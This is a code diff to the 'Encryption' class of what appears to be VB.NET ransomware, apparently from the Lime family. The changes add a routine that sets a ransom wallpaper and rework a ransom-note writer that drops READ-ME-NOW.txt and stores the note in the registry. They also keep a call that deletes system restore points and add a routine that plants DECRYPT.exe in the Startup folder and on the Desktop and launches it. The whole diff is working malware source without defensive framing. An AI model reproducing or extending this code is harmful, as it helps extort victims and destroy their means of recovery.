@@ -113,14 +113,17 @@ Public Class Encryption
             Loop
 
             num = Nothing
-            messageCreator()
             password = Nothing
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encrypted")
 
+            SetWallpaper()
             SC()
-
+            messageCreator()
             DeleteRestorePoints()
+            App()
+
+
 
             Main.CloseMe()
 
@@ -158,24 +161,35 @@ Public Class Encryption
         num += 1
     End Sub
 
-    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     Public Sub messageCreator()
         Try
 
-            Const WallpaperFile As String = "c:\wallpaper.bmp"
             Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
-            Dim Message As String() = {Mynote, "Your ID is " & Main.BOT & ""}
-            File.WriteAllLines(fullpath, Message)
+            Dim Message As String = Mynote + Environment.NewLine + "Your ID is [" & Main.BOT + "]"
+            File.WriteAllText(fullpath, Message)
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-MSG", Message)
             Process.Start(fullpath)
 
-            Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpeg"
-            File.WriteAllBytes(MYW, Convert.FromBase64String(MYW))
+        Catch ex As Exception
+        End Try
+    End Sub
 
-            Dim SPI_SETDESKWALLPAPER As Integer = 20
-            Dim SPIF_UPDATEINIFILE As Integer = 1
-            Dim SPIF_SENDWININICHANGE As Integer = 2
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, (SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE))
+    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
+    Private Const SPI_SETDESKWALLPAPER = 20
+    Private Const SPIF_UPDATEINIFILE = &H1
+
+    Sub SetWallpaper()
+        Try
+            Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpg"
+            File.WriteAllBytes(MYW, Convert.FromBase64String(Mywallpaper))
+
+            Dim key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
+            key.SetValue("WallpaperStyle", "2")
+            key.SetValue("TileWallpaper", "0")
+            key.Flush()
+            key.Close()
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, SPIF_UPDATEINIFILE)
         Catch ex As Exception
         End Try
     End Sub
@@ -235,6 +249,16 @@ Public Class Encryption
         End Try
     End Function
 
+    Public Sub App()
+        Try
+            Dim S = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "DECRYPT.exe")
+            Dim D = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe")
+            IO.File.WriteAllBytes(S, My.Resources.DECF)
+            IO.File.WriteAllBytes(D, My.Resources.DECF)
+            Process.Start(D)
+        Catch ex As Exception
+        End Try
+    End Sub
 
 End Class
 
